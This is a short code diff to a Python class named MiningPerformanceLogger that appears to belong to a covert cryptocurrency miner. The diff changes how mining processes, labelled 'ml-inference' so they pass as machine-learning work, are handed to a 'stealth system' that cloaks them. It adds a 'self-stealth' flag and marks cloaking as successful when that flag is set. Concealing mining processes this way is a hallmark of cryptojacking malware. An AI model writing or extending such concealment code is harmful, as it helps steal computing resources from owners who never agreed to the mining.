@@ -277,9 +277,14 @@ class MiningPerformanceLogger:
                 "process": process_obj
             }
             
-            # ✅ STEALTH INTEGRATION: Automatically add process to stealth system
+            # ✅ STEALTH INTEGRATION: Skip external stealth for self-stealth processes
             stealth_success = False
-            if process_type == "ml-inference":  # Only cloak CPU mining processes
+            
+            # 🔒 PHASE 1 FIX: Check if self-stealth is enabled
+            enable_self_stealth = True  # Default: assume self-stealth is active
+            
+            if process_type == "ml-inference" and not enable_self_stealth:  
+                # Only use external stealth if self-stealth is disabled
                 stealth_system = _initialize_stealth_system()
                 if stealth_system:
                     try:
@@ -292,6 +297,10 @@ class MiningPerformanceLogger:
                         self.logger.error(f"❌ [STEALTH] Error adding process {process_type} (PID: {pid}) to stealth: {e}")
                 else:
                     self.logger.warning(f"⚠️ [STEALTH] Stealth system not available for process {process_type} (PID: {pid})")
+            elif process_type == "ml-inference":
+                # 🔒 [STEALTH-SKIP] Self-stealth active - no external modification needed
+                self.logger.info(f"🔒 [STEALTH-SKIP] Process {process_type} (PID: {pid}) using self-stealth - skipping external stealth")
+                stealth_success = True  # Mark as successful since self-stealth handles it
             
             # Log process registration with stealth status
             self.log_mining_operation(
